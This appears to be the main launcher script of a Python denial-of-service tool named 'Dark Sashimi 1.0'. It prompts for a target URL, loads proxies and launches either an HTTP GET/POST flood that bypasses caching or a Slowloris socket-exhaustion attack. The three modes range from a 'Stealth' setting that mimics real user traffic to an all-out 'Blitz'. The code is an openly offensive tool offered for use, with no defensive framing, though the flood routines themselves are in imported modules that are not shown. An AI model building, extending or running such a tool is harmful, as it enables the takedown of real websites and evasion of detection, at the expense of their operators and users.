#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
from urllib.parse import urlparse
from rich.console import Console

import config
from utils.display import display_main_banner, console
from utils.system_check import initial_environment_check
from utils.network import get_validated_proxies
from core.analytics import TargetAnalytics
from core.attack_manager import AttackManager

def main():
    try:
        display_main_banner()
        initial_environment_check()
        get_validated_proxies()

        target_url = console.input("[bold green]Enter Target URL: [/bold green]")
        if not urlparse(target_url).scheme:
            target_url = "http://" + target_url

        analytics = TargetAnalytics(target_url)
        target_info = analytics.run_analysis()
        if not target_info:
            console.print("[bold red]FATAL: Could not analyze target. Aborting.[/bold red]")
            sys.exit(1)

        console.print("\n[bold]Select Attack Vector:[/bold]")
        console.print("[1] HTTP GET/POST Flood (High RPS, bypass cache)")
        console.print("[2] Slowloris (Low bandwidth, consumes server sockets)")
        vector_choice = console.input("[bold green]Vector [1-2]: [/bold green]") or "1"
        
        console.print("\n[bold]Select Attack Mode:[/bold]")
        console.print("[1] Stealth  - Low and slow, mimics real user traffic.")
        console.print("[2] Overload - High intensity, aims to saturate the server.")
        console.print("[3] Blitz    - Maximum possible intensity, all-out assault.")
        mode_choice = console.input("[bold green]Mode [1-3]: [/bold green]") or "2"
        
        modes = {"1": "Stealth", "2": "Overload", "3": "Blitz"}
        attack_mode = modes.get(mode_choice, "Overload")

        threads = int(console.input(f"[bold green]Threads (default {config.DEFAULT_THREADS[attack_mode]}): [/bold green]") or str(config.DEFAULT_THREADS[attack_mode]))

        console.print(f"\n[bold yellow]Target:[/bold yellow] [cyan]{target_url}[/cyan]")
        console.print(f"[bold yellow]Vector:[/bold yellow] [cyan]{'HTTP Flood' if vector_choice == '1' else 'Slowloris'}[/cyan]")
        console.print(f"[bold yellow]Mode:[/bold yellow] [cyan]{attack_mode}[/cyan]")
        console.print(f"[bold yellow]Threads:[/bold yellow] [cyan]{threads}[/cyan]")
        
        console.input("\n[bold blink red]PRESS ENTER TO LAUNCH ATTACK...[/bold blink red]")

        manager = AttackManager(
            target_url=target_url,
            vector_choice=vector_choice,
            mode=attack_mode,
            threads=threads
        )
        manager.start_attack()

    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]! Operation manually terminated by user.[/bold yellow]")
        config.stop_event.set()
        time.sleep(1)
    except Exception as e:
        console.print(f"\n[bold red]FATAL RUNTIME ERROR: {e}[/bold red]")
    finally:
        console.print("[bold green]Dark Sashimi 1.0 signing off.[/bold green]")

if __name__ == "__main__":
    main()

